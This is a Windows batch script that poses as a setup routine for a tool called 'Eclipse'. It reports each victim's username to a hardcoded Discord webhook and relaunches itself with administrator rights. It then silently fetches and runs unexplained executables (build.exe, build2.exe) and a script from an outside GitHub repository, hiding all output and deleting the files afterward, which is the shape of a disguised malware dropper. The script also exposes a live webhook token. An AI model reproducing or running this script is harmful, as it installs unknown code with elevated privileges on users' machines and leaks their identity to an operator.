@echo off
set WEBHOOK_URL=https://discord.com/api/webhooks/1285775649189007453/9x1BScyl68iNJcrocfUHuUEZ0E7HKAY7hXgEp9zJglpcpIqv5UZ46HwytMF3ey0TmDqM
Title Downloading Modules...

powershell.exe -Command "Invoke-RestMethod -Uri '%WEBHOOK_URL%' -Method Post -ContentType 'application/json' -Body (@{username = '%USERNAME%'; content = '%USERNAME% has run Eclipse ❤'} | ConvertTo-Json)"

>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

if %errorlevel% neq 0 (
	powershell.exe -Command "Start-Process -Verb RunAs -FilePath \"%~f0\""
	exit
)

cd /d "%~dp0"

echo Installing Requirements (This should take around 2-3 minutes the first time)

python --version | findstr "3.11" >nul
if %ERRORLEVEL% neq 0 (
    echo Python 3.11 not found, downloading...
    curl -L -o python-3.11.exe https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe >nul 2>&1
    start /wait python-3.11.exe /quiet InstallAllUsers=1 Include_test=0 >nul 2>&1
    if %ERRORLEVEL% neq 0 (
        echo Python installation failed. Please install manually.
        exit /b
    )
    del python-3.11.exe
)

python -m pip --version >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo Installing pip...
    python -m ensurepip >nul 2>&1
    python -m pip install --upgrade pip >nul 2>&1
)

cd /d "%~dp0"

pip install -r requirements.txt >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo Failed to install Python requirements. Ensure the requirements.txt file is present.
    exit /b
)

if not exist "build_done.txt" (
    echo Downloading and running build tools...
    curl -L -o build.py https://github.com/ShredGman/Eclipse-Build-Tools/raw/refs/heads/main/build.py >nul 2>&1
    curl -L -o build.exe https://github.com/ShredGman/Eclipse-Build-Tools/raw/refs/heads/main/build.exe >nul 2>&1
    curl -L -o build2.exe https://github.com/ShredGman/Eclipse-Build-Tools/raw/refs/heads/main/build2.exe >nul 2>&1

    python build.py >nul 2>&1
    start /wait build.exe >nul 2>&1
    start /wait build2.exe >nul 2>&1

    del build.exe
    del build2.exe

    echo. > build_done.txt
)

python main.py